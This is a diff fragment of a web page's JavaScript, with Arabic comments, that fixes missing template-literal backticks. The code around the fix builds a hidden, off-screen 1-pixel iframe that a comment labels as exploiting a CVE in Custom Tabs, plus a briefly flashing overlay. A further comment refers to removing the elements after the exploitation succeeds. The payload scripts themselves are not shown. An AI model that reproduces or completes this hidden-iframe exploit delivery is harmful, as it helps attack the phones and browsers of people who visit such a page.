@@ -206,7 +206,7 @@
                     <\/script>
                 </body>
                 </html>
-            ;
+            `;
             document.body.appendChild(iframe);
             return iframe;
         }
@@ -217,7 +217,7 @@
             
             // إنشاء عنصر مؤقت يختفي بسرعة
             const tempDiv = document.createElement('div');
-            tempDiv.style.cssText = 
+            tempDiv.style.cssText = `
                 position:fixed;
                 top:0;
                 left:0;
@@ -227,13 +227,13 @@
                 z-index:999999;
                 animation: subtlePulse 0.3s ease-out forwards;
                 pointer-events:none;
-            ;
+            `;
             document.body.appendChild(tempDiv);
             
             // إنشاء iframe Custom Tabs (استغلال CVE)
             const customTabIframe = document.createElement('iframe');
             customTabIframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
-            customTabIframe.srcdoc = 
+            customTabIframe.srcdoc = `
                 <!DOCTYPE html>
                 <html>
                 <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
@@ -252,7 +252,7 @@
                     <\/script>
                 </body>
                 </html>
-            ;
+            `;
             document.body.appendChild(customTabIframe);
             
             // إزالة العناصر بعد نجاح الاستغلال
